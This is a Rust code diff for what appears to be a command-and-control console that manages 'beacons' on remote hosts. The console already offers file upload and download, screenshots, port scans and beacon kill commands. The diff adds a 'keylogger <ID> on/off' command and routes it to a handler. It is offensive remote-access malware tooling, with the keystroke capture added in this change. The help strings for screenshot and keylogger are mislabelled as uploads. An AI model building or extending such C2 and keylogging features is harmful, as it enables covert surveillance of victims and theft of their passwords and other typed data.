@@ -36,6 +36,7 @@ fn print_help() -> String {
     output.push_str("  upload <ID> <file> <dest>        Upload a file to a host\n");
     output.push_str("  download <ID> <file> <dest>      Download a file from a host\n");
     output.push_str("  screenshot <ID>                  Upload a file to a host\n");
+    output.push_str("  keylogger <ID> on/off            Upload a file to a host\n");
     output.push_str("  portscan <ID> <IP> <NUM1> <NUM2> Port scan a host\n");
     output.push_str("  kill <ID>                        Kills the beacon on the host\n");
     output.push_str("  exit                             Close all connections and exit(ctrl+d)\n\n");
@@ -173,7 +174,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                     println!("Error: {}", e);
                                 }
                             }
-                        } else if command.starts_with("kill") {
+                        } else if command.starts_with("keylogger") {
+                            let output = utils::handle_keylogger(&active_connections_clone, &command, *raw_connection_clone.lock().await);
+                            match output.await {
+                                Ok(output) => {
+                                    println!("{}", output);
+                                }
+                                Err(e) => {
+                                    println!("Error: {}", e);
+                                }
+                            }
+                        }else if command.starts_with("kill") {
                             let output = utils::handle_kill(&active_connections_clone, &command, *raw_connection_clone.lock().await);
                             match output.await {
                                 Ok(output) => {
